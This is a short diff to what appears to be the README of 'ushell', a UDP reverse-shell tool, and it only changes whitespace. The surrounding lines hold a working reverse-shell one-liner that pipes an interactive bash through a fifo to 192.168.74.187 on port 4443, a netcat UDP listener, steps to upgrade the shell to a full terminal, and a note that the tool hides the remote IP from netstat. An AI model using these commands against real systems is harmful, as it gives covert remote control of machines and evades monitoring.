@@ -12,14 +12,14 @@ mkfifo fifo;./ushell -u 192.168.74.187 4443 < fifo | ./ushell -p bash -i >& fifo
 nc -ulvp 4443
 
 # support tab/arrow/ctrl-c
-ctrl-z //return to host
-stty raw -echo
-fg //return to shell
-reset
-// make beautiful
-export SHELL=**
-export TERM=**
-stty rows ** columns ** 
+ctrl-z //return to host  
+stty raw -echo  
+fg //return to shell  
+reset  
+// make beautiful  
+export SHELL=**  
+export TERM=**  
+stty rows ** columns **   
 
 # key property
 + udp socket without connect(thus hide remote ip from netstat)
